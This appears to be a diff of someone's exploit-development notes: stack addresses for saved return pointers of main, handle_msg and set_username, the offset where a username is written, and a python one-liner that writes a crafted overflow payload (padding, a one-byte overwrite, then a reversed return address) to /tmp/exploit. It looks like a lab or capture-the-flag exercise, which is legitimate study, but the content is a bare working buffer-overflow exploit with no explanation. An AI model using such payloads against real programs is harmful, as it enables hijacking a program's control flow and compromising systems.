@@ -1,3 +1,19 @@
 $rbp -0x98  0x7fffffffe458 
 
 0x7fffffffe500 -address where we save username
+
+
+0x7fffffffe5d8 -- rip main
+
+0x7fffffffe5c8 - rip handle_msg
+
+0x7fffffffe4f8 -r rip set_username
+
+
+0x7fffffffe458 - rbp -0x98 
+
+
+0x7fffffffe460 - writing username 
+
+
+python -c 'print("a" * 40 + "\xd0\n" + "b" *200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1])' > /tmp/exploit
